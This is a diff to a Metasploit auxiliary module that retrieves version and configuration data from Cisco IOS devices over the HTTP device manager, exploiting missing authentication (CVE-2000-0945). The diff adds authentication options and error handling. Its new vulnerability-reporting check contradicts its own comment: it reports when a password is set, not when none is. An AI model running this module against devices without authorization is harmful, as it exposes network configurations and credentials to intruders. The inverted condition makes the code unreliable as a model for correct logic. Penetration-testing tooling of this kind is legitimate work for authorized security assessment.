@@ -27,10 +27,11 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info={})
 		super(update_info(info,
-			'Name'           => 'Cisco Device HTTP Unauthenticated Access',
+			'Name'           => 'Cisco Device HTTP Device Manager Access',
 			'Description'    => %q{
 					This module gathers data from a Cisco device (router or switch) with the device manager
-				web interface exposed and no password set.	
+				web interface exposed. The BasicAuthUser and BasicAuthPass options can be used to specify
+				authentication.	
 			},
 			'Author'		=> [ 'hdm' ],
 			'License'		=> MSF_LICENSE,
@@ -50,22 +51,35 @@ class Metasploit3 < Msf::Auxiliary
 			'uri'  		=>  "/exec/show/version/CR",
 			'method'   	=> 'GET'
 		}, 20)
-			
+
+		if res and res.code == 401
+			print_error("#{rhost}:#{rport} Failed to authenticate to this device")
+			return
+		end
+
+		if res and res.code != 200
+			print_error("#{rhost}:#{rport} Unexpected response code from this device #{res.code}")
+			return
+		end
+					
 		if res and res.body and res.body =~ /Cisco (Internetwork Operating System|IOS) Software/
-			print_good("#{rhost}:#{rport} Found vulnerable device")
-				
-			report_vuln(
-				:host	=> rhost,
-				:port	=> rport,
-				:name	=> 'IOS-HTTP-NO-AUTH',
-				:info	=> "http://#{rhost}:#{rport}/exec/show/version/CR",
-				:refs   =>
-				[
-					[ 'BID', '1846'],
-					[ 'CVE', '2000-0945'],
-					[ 'OSVDB', '444'],
-				]
-			)
+			print_good("#{rhost}:#{rport} Successfully authenticated to this device")
+	
+			# Report a vulnerability only if no password was specified		
+			if datastore['BasicAuthPass'].to_s.length > 0
+				report_vuln(
+					:host	=> rhost,
+					:port	=> rport,
+					:name	=> 'IOS-HTTP-NO-AUTH',
+					:info	=> "http://#{rhost}:#{rport}/exec/show/version/CR",
+					:refs   =>
+					[
+						[ 'BID', '1846'],
+						[ 'CVE', '2000-0945'],
+						[ 'OSVDB', '444'],
+					]
+				)
+			end
 				
 			res = send_request_cgi({
 				'uri'  		=>  "/exec/show/config/CR",
